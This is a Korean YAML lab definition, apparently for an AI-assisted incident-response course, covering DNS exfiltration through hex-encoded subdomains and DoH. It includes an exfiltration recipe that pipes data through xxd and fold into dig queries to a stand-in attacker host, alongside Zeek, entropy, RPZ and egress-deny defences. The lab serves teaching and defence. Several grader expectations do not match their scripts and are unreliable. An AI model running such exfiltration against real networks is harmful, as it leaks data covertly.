@@ -1,0 +1,525 @@
+lab_id: agent-ir-adv-ai-week10
+title: DNS Exfiltration + AI 인코딩 IR (AI 지원)
+version: ai
+course: agent-ir-adv-ai
+week: 10
+description: 저속 은밀한 누출. Zeek·엔트로피·RPZ·DoH 차단. AI SubAgent 자동 실행·검증.
+difficulty: hard
+duration_minutes: 150
+objectives:
+- 공격 원리를 이해하고 재현한다
+- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
+- Human vs Agent 대응을 비교한다
+pass_threshold: 0.6
+steps:
+- order: 1
+  instruction: hex 인코딩 서브도메인
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
+  points: 9
+  answer: '🤖 프롬프트: hex 인코딩 서브도메인
+
+    📎 참고 (CLI): mkdir -p ~/w10 && echo ''HELLO'' | xxd -p | head -c 20; echo ''.attacker.example'''
+  answer_detail: '[공격] Subdomain 인코딩 기본.'
+  verify:
+    type: output_contains
+    expect:
+    - .attacker
+    - HEX
+    field: stdout
+    semantic:
+      intent: hex 인코딩 서브도메인 — echo data | xxd -p | fold -w 63 + 각 chunk 를 dig TXT
+        $chunk.exfil.attacker.com. hex 는 base64 보다 낮은 엔트로피 → 탐지 회피 시도
+      success_criteria:
+      - xxd hex 인코딩
+      - 63 바이트 fold
+      - DNS 쿼리
+      acceptable_methods:
+      - xxd + fold + dig
+      negative_signs:
+      - hex 없음
+  target_vm: web
+  script: mkdir -p ~/w10 && echo 'HELLO' | xxd -p | head -c 20; echo '.attacker.example'
+  risk_level: low
+  bastion_prompt: 'hex 인코딩 서브도메인
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 2
+  instruction: DoH 엔드포인트 예
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
+  points: 10
+  answer: '🤖 프롬프트: DoH 엔드포인트 예
+
+    📎 참고 (CLI): cat > ~/w10/doh.md <<''M''
+
+    - https://1.1.1.1/dns-query
+
+    - https://dns.google/dns-query
+
+    - https://doh.opendns.com/dns-query
+
+    M
+
+    cat ~/w10/doh.md'
+  answer_detail: '[공격] 공격자가 사용 가능.'
+  verify:
+    type: output_contains
+    expect:
+    - dns-query
+    - DoH
+    field: stdout
+    semantic:
+      intent: 'DoH DNS-over-HTTPS 엔드포인트 — curl https://cloudflare-dns.com/dns-query?name=xxx&type=A
+        --header accept: application/dns-json. 전통 DNS 방화벽 우회. 암호화 채널 악용'
+      success_criteria:
+      - DoH 엔드포인트 + HTTPS
+      - accept application/dns-json
+      acceptable_methods:
+      - curl DoH
+      - Google DoH 8.8.8.8
+      negative_signs:
+      - 전통 DNS 만
+  target_vm: web
+  script: 'cat > ~/w10/doh.md <<''M''
+
+    - https://1.1.1.1/dns-query
+
+    - https://dns.google/dns-query
+
+    - https://doh.opendns.com/dns-query
+
+    M
+
+    cat ~/w10/doh.md'
+  risk_level: low
+  bastion_prompt: 'DoH 엔드포인트 예
+
+
+    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
+- order: 3
+  instruction: Zeek 긴 쿼리 룰
+  hint: 6단계 IR 중 탐지 단계. target_vm=secu.
+  category: analysis
+  points: 11
+  answer: "\U0001F916 프롬프트: Zeek 긴 쿼리 룰\n\U0001F4CE 참고 (CLI): cat > ~/w10/zeek.zeek\
+    \ <<'Z'\nevent dns_request(c: connection, msg: dns_msg, query: string, qtype:\
+    \ count, qclass: count) {\n  if (|query| > 50) {\n    print fmt(\"long_query:\
+    \ src=%s q=%s\", c$id$orig_h, query);\n  }\n}\nZ\ncat ~/w10/zeek.zeek"
+  answer_detail: '[탐지] 50자 이상 쿼리.'
+  verify:
+    type: output_contains
+    expect: dns_request
+    field: stdout
+    semantic:
+      intent: Zeek 긴 쿼리 룰 — Zeek script 에서 length(dns.query) > 50 AND entropy > 3.5
+        → 의심. Zeek dns.log + post-processing. ML 기반 탐지 보완
+      success_criteria:
+      - Zeek script 또는 dns.log 후처리
+      - length + entropy
+      acceptable_methods:
+      - Zeek event handler
+      - dns.log awk
+      negative_signs:
+      - Zeek 없음
+  target_vm: secu
+  script: "cat > ~/w10/zeek.zeek <<'Z'\nevent dns_request(c: connection, msg: dns_msg,\
+    \ query: string, qtype: count, qclass: count) {\n  if (|query| > 50) {\n    print\
+    \ fmt(\"long_query: src=%s q=%s\", c$id$orig_h, query);\n  }\n}\nZ\ncat ~/w10/zeek.zeek"
+  risk_level: medium
+  bastion_prompt: Zeek 긴 쿼리 룰
+- order: 4
+  instruction: 엔트로피 기반 탐지
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
+  category: analysis
+  points: 12
+  answer: "\U0001F916 프롬프트: 엔트로피 기반 탐지\n\U0001F4CE 참고 (CLI): cat > ~/w10/entropy.py\
+    \ <<'PY'\nimport math\nfrom collections import Counter\ndef H(s):\n    c = Counter(s);\
+    \ t = len(s)\n    return -sum((f/t)*math.log2(f/t) for f in c.values()) if t else\
+    \ 0\nprint('normal', H('www.google.com'))\nprint('encoded', H('48454c4c4f.attacker.example'))\n\
+    PY\npython3 ~/w10/entropy.py"
+  answer_detail: '[탐지] >4.5 의심.'
+  verify:
+    type: output_contains
+    expect:
+    - normal
+    - 엔트로피
+    field: stdout
+    semantic:
+      intent: 엔트로피 기반 탐지 — python3 Shannon entropy 함수 + DNS 쿼리 batch 검사 + 임계치 > 3.5.
+        randomized vs 도메인 이름 구분
+      success_criteria:
+      - Shannon entropy 함수
+      - 임계치 3.5
+      acceptable_methods:
+      - python math.log2 + Counter
+      negative_signs:
+      - 엔트로피 없음
+  target_vm: bastion
+  script: "cat > ~/w10/entropy.py <<'PY'\nimport math\nfrom collections import Counter\n\
+    def H(s):\n    c = Counter(s); t = len(s)\n    return -sum((f/t)*math.log2(f/t)\
+    \ for f in c.values()) if t else 0\nprint('normal', H('www.google.com'))\nprint('encoded',\
+    \ H('48454c4c4f.attacker.example'))\nPY\npython3 ~/w10/entropy.py"
+  risk_level: low
+  bastion_prompt: 엔트로피 기반 탐지
+- order: 5
+  instruction: 재조합 스크립트
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
+  category: analysis
+  points: 13
+  answer: '🤖 프롬프트: 재조합 스크립트
+
+    📎 참고 (CLI): cat > ~/w10/reassemble.py <<''PY''
+
+    queries = [''48454c4c4f.attacker.example'', ''20776f726c64.attacker.example'',
+    ''21.attacker.example'']
+
+    hex_parts = [q.split(''.'')[0] for q in queries]
+
+    message = bytes.fromhex(''''.join(hex_parts)).decode()
+
+    print(''message:'', repr(message))
+
+    PY
+
+    python3 ~/w10/reassemble.py'
+  answer_detail: '[분석] 유출 본문 복원.'
+  verify:
+    type: output_contains
+    expect:
+    - message
+    - /recompose_iptables.sh
+    - pipefail
+    field: stdout
+    semantic:
+      intent: 재조합 스크립트 — captured DNS 쿼리 chunks 를 순서대로 concatenate → base64/hex decode
+        → 원본 복원. 유출 데이터 재구성 + 영향 평가
+      success_criteria:
+      - DNS chunks 재조합
+      - decode 로직
+      acceptable_methods:
+      - python + base64/hex decode
+      negative_signs:
+      - 재조합 없음
+  target_vm: bastion
+  script: 'cat > ~/w10/reassemble.py <<''PY''
+
+    queries = [''48454c4c4f.attacker.example'', ''20776f726c64.attacker.example'',
+    ''21.attacker.example'']
+
+    hex_parts = [q.split(''.'')[0] for q in queries]
+
+    message = bytes.fromhex(''''.join(hex_parts)).decode()
+
+    print(''message:'', repr(message))
+
+    PY
+
+    python3 ~/w10/reassemble.py'
+  risk_level: low
+  bastion_prompt: 재조합 스크립트
+- order: 6
+  instruction: 누출량 추정
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
+  category: analysis
+  points: 14
+  answer: '🤖 프롬프트: 누출량 추정
+
+    📎 참고 (CLI): cat > ~/w10/estimate.md <<''M''
+
+    - 쿼리 당 bytes: 평균 30 (subdomain 길이 기준)
+
+    - 일간 쿼리 수: 1000
+
+    - 추정 일간 누출: ~30 KB
+
+    - 24h 누적: 720 KB
+
+    M
+
+    cat ~/w10/estimate.md'
+  answer_detail: '[분석] 저속 지속.'
+  verify:
+    type: output_contains
+    expect:
+    - '720'
+    - shell
+    field: stdout
+    semantic:
+      intent: 누출량 추정 — 총 DNS 쿼리 수 × 평균 chunk 크기 = 추정 누출 바이트. 시간당 추정치 + 영향 데이터 유형 (고객
+        DB 가정)
+      success_criteria:
+      - 누출 바이트 계산
+      - 데이터 유형 추정
+      acceptable_methods:
+      - python 계산 + Wazuh 쿼리
+      negative_signs:
+      - 누출량 계산 없음
+  target_vm: bastion
+  script: 'cat > ~/w10/estimate.md <<''M''
+
+    - 쿼리 당 bytes: 평균 30 (subdomain 길이 기준)
+
+    - 일간 쿼리 수: 1000
+
+    - 추정 일간 누출: ~30 KB
+
+    - 24h 누적: 720 KB
+
+    M
+
+    cat ~/w10/estimate.md'
+  risk_level: low
+  bastion_prompt: 누출량 추정
+- order: 7
+  instruction: RPZ sinkhole
+  hint: 6단계 IR 중 초동대응 단계. target_vm=siem.
+  category: analysis
+  points: 15
+  answer: "\U0001F916 프롬프트: RPZ sinkhole\n\U0001F4CE 참고 (CLI): cat > ~/w10/rpz.conf\
+    \ <<'C'\nzone \"rpz\" {\n  type master;\n  file \"rpz.zone\";\n};\nresponse-policy\
+    \ { zone \"rpz\"; };\nC\ncat ~/w10/rpz.conf"
+  answer_detail: '[초동대응] 악성 도메인 응답 조작.'
+  verify:
+    type: output_contains
+    expect: rpz
+    field: stdout
+    semantic:
+      intent: RPZ Response Policy Zone sinkhole — BIND RPZ 로 attacker.com 을 127.0.0.1
+        또는 walled-garden 으로 redirect. 신속 봉쇄. 우회 네트워크 DNS 채널 차단
+      success_criteria:
+      - RPZ zone 설정
+      - sinkhole redirect
+      acceptable_methods:
+      - BIND named.conf RPZ
+      - dnsmasq --address
+      negative_signs:
+      - RPZ 개념 없음
+  target_vm: siem
+  script: "cat > ~/w10/rpz.conf <<'C'\nzone \"rpz\" {\n  type master;\n  file \"rpz.zone\"\
+    ;\n};\nresponse-policy { zone \"rpz\"; };\nC\ncat ~/w10/rpz.conf"
+  risk_level: low
+  bastion_prompt: RPZ sinkhole
+- order: 8
+  instruction: DoH 차단 정책
+  hint: 6단계 IR 중 초동대응 단계. target_vm=secu.
+  category: analysis
+  points: 16
+  answer: '🤖 프롬프트: DoH 차단 정책
+
+    📎 참고 (CLI): cat > ~/w10/doh-block.md <<''M''
+
+    - 외부 DoH 엔드포인트 IP 차단 (firewall)
+
+    - 내부 DNS 강제 (DHCP Option 6)
+
+    - TLS SNI 기반 탐지
+
+    M
+
+    cat ~/w10/doh-block.md'
+  answer_detail: '[초동대응] DoH 우회 차단.'
+  verify:
+    type: output_contains
+    expect:
+    - DHCP
+    - DoH 차단
+    field: stdout
+    semantic:
+      intent: DoH 차단 정책 — nftables로 DoH known endpoints (cloudflare-dns.com·dns.google·mozilla.cloudflare-dns.com)
+        IP 차단 + firewall egress 443 DPI. 우회 채널 구조적 차단
+      success_criteria:
+      - DoH endpoint 차단 목록
+      - nft egress rule
+      acceptable_methods:
+      - nftables + IP 블랙리스트
+      negative_signs:
+      - DoH 개념 없음
+  target_vm: secu
+  script: 'cat > ~/w10/doh-block.md <<''M''
+
+    - 외부 DoH 엔드포인트 IP 차단 (firewall)
+
+    - 내부 DNS 강제 (DHCP Option 6)
+
+    - TLS SNI 기반 탐지
+
+    M
+
+    cat ~/w10/doh-block.md'
+  risk_level: medium
+  bastion_prompt: DoH 차단 정책
+- order: 9
+  instruction: Agent Playbook
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 17
+  answer: "\U0001F916 프롬프트: Agent Playbook\n\U0001F4CE 참고 (CLI): cat > ~/w10/agent.yaml\
+    \ <<'Y'\nplaybook_id: pb-dns-exfil\nsteps:\n  - skill: sinkhole_domain\n  - skill:\
+    \ limit_host_egress\n  - skill: block_doh_endpoints\n  - skill: capture_24h_queries\n\
+    Y\ncat ~/w10/agent.yaml"
+  answer_detail: '[초동대응] 자동 대응.'
+  verify:
+    type: output_contains
+    expect: sinkhole
+    field: stdout
+    semantic:
+      intent: Agent Playbook — DNS entropy alert → DNS sinkhole + DoH block + notify
+        DPO
+      success_criteria:
+      - DNS 특화 playbook
+      acceptable_methods:
+      - cat > yaml
+      negative_signs:
+      - 일반
+  target_vm: bastion
+  script: "cat > ~/w10/agent.yaml <<'Y'\nplaybook_id: pb-dns-exfil\nsteps:\n  - skill:\
+    \ sinkhole_domain\n  - skill: limit_host_egress\n  - skill: block_doh_endpoints\n\
+    \  - skill: capture_24h_queries\nY\ncat ~/w10/agent.yaml"
+  risk_level: low
+  bastion_prompt: Agent Playbook
+- order: 10
+  instruction: 법적 고려
+  hint: 6단계 IR 중 보고 단계. target_vm=bastion.
+  category: analysis
+  points: 18
+  answer: '🤖 프롬프트: 법적 고려
+
+    📎 참고 (CLI): cat > ~/w10/legal.md <<''M''
+
+    - 유출 본문에 개인정보?
+
+    - GDPR 72시간·개인정보보호법 34조
+
+    - 고객 개별 통지 필요 여부
+
+    M
+
+    cat ~/w10/legal.md'
+  answer_detail: '[보고] 본문 민감도 확인.'
+  verify:
+    type: output_contains
+    expect: GDPR
+    field: stdout
+    semantic:
+      intent: 법적 고려 /tmp/dns_legal.md — 개인정보 유출 시 72시간 신고 (개보법 제34조) + 정통망법 침해사고 신고
+        + 유럽 GDPR Article 33 (72시간)
+      success_criteria:
+      - /tmp/dns_legal.md
+      - 국내·해외 규제 인용
+      acceptable_methods:
+      - cat > md
+      negative_signs:
+      - 규제 언급 없음
+  target_vm: bastion
+  script: 'cat > ~/w10/legal.md <<''M''
+
+    - 유출 본문에 개인정보?
+
+    - GDPR 72시간·개인정보보호법 34조
+
+    - 고객 개별 통지 필요 여부
+
+    M
+
+    cat ~/w10/legal.md'
+  risk_level: low
+  bastion_prompt: 법적 고려
+- order: 11
+  instruction: DNS 로깅·상시 분석
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 19
+  answer: '🤖 프롬프트: DNS 로깅·상시 분석
+
+    📎 참고 (CLI): cat > ~/w10/dns-logging.md <<''M''
+
+    - 모든 DNS 쿼리 로깅 (Zeek)
+
+    - 매 5분 엔트로피·빈도 분석
+
+    - 허용 목록 외 도메인 경보
+
+    M
+
+    cat ~/w10/dns-logging.md'
+  answer_detail: '[재발방지] 상시 감시.'
+  verify:
+    type: output_contains
+    expect:
+    - 엔트로피
+    - DNS 로깅
+    field: stdout
+    semantic:
+      intent: DNS 로깅 상시 분석 — /etc/bind/named.conf.options 에 logging category queries
+        활성 + Elastic Stack 으로 전체 DNS 쿼리 수집 · 시계열 분석. DNS 모니터링 baseline
+      success_criteria:
+      - BIND queries 로깅
+      - ELK 수집
+      acceptable_methods:
+      - BIND logging + Filebeat
+      negative_signs:
+      - 로깅 없음
+  target_vm: bastion
+  script: 'cat > ~/w10/dns-logging.md <<''M''
+
+    - 모든 DNS 쿼리 로깅 (Zeek)
+
+    - 매 5분 엔트로피·빈도 분석
+
+    - 허용 목록 외 도메인 경보
+
+    M
+
+    cat ~/w10/dns-logging.md'
+  risk_level: low
+  bastion_prompt: DNS 로깅·상시 분석
+- order: 12
+  instruction: egress default-deny
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 20
+  answer: '🤖 프롬프트: egress default-deny
+
+    📎 참고 (CLI): cat > ~/w10/egress.md <<''M''
+
+    - CI runner·서버 egress 기본 차단
+
+    - 허용 도메인 리스트 운영
+
+    - DNS도 내부 리졸버 강제
+
+    M
+
+    cat ~/w10/egress.md'
+  answer_detail: '[재발방지] 화이트리스트.'
+  verify:
+    type: output_contains
+    expect: egress
+    field: stdout
+    semantic:
+      intent: egress default-deny — outbound 기본 차단 + allowlist (업무 도메인·update 서버)
+        + break-glass 절차. DNS exfil 근본 차단. zero trust egress
+      success_criteria:
+      - egress 기본 deny
+      - allowlist + break-glass
+      acceptable_methods:
+      - nft output drop + accept list
+      - egress proxy
+      negative_signs:
+      - default allow
+  target_vm: bastion
+  script: 'cat > ~/w10/egress.md <<''M''
+
+    - CI runner·서버 egress 기본 차단
+
+    - 허용 도메인 리스트 운영
+
+    - DNS도 내부 리졸버 강제
+
+    M
+
+    cat ~/w10/egress.md'
+  risk_level: low
+  bastion_prompt: egress default-deny
